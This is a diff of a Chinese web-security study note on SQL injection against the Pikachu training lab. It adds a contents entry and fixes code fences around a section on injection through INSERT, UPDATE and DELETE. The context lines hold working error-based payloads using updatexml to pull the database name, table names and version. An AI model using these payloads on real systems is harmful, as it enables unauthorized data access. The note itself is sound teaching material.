@@ -29,6 +29,7 @@
         - [mysql相关知识](#mysql%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86)
         - [案例2-基于information_schema的信息获取](#%E6%A1%88%E4%BE%8B2-%E5%9F%BA%E4%BA%8Einformation_schema%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96)
         - [案例3-基于函数报错的信息获取](#%E6%A1%88%E4%BE%8B3-%E5%9F%BA%E4%BA%8E%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96)
+        - [案例4-基于insert、update、delete的注入](#%E6%A1%88%E4%BE%8B4-%E5%9F%BA%E4%BA%8Einsertupdatedelete%E7%9A%84%E6%B3%A8%E5%85%A5)
 
 <!-- /TOC -->
 # Web安全
@@ -415,6 +416,7 @@ kobe' and updatexml(1,concat(0x7e,database()),0)#
 kobe' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = 'pikachu')),0)# --Operand should contain 1 column(s)
 --使用这种方式，可以和之前一样，一个一个的拿到表，拿到字段，拿到信息
 kobe' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = 'pikachu' limit 0,1)),0)# --XPATH syntax error: '~httpinfo',limit 0/1/2/3/4/5 1
+```
 
 ### 案例4-基于insert、update、delete的注入
 ```sql
@@ -424,7 +426,6 @@ insert into users(username,password,id) values('xiaoming',123456,001);
 insert into users(username,password,id) values('xiaoming' or updatexml(1,concat(0x7e,version()),0) or '',123456,001);
 --payload
 xiaoming' or updatexml(1,concat(0x7e,version()),0) or '
-
 
 ```
 
